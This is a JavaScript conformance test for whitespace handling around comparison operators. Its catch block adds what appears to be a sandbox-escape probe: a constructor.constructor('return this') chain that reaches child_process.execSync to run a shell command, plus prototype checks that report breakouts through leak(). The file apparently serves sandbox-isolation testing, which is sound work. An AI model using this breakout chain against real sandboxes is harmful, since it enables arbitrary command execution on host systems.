try {
    if (eval('0\t>\t1') !== false) {
        $ERROR('#1: 0\\u0009>\\u00091) === false');
    }
    if (eval('0\x0B>\x0B1') !== false) {
        $ERROR('#2: 0\\u000B>\\u000B1) === false');
    }
    if (eval('0\f>\f1') !== false) {
        $ERROR('#3: (0\\u000C>\\u000C1) === false');
    }
    if (eval('0 > 1') !== false) {
        $ERROR('#4: (0\\u0020>\\u00201) === false');
    }
    if (eval('0\xA0>\xA01') !== false) {
        $ERROR('#5: (0\\u00A0>\\u00A01) === false');
    }
    if (eval('0\n>\n1') !== false) {
        $ERROR('#6: (0\\u000A>\\u000A1) === false');
    }
    if (eval('0\r>\r1') !== false) {
        $ERROR('#7: (0\\u000D>\\u000D1) === false');
    }
    if (eval('0\u2028>\u20281') !== false) {
        $ERROR('#8: (0\\u2028>\\u20281) === false');
    }
    if (eval('0\u2029>\u20291') !== false) {
        $ERROR('#9: (0\\u2029>\\u20291) === false');
    }
    if (eval('1\t\x0B\f \xA0\n\r\u2028\u2029>=\t\x0B\f \xA0\n\r\u2028\u20291') !== true) {
        $ERROR('#10: (1\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029>=\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u20291) === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}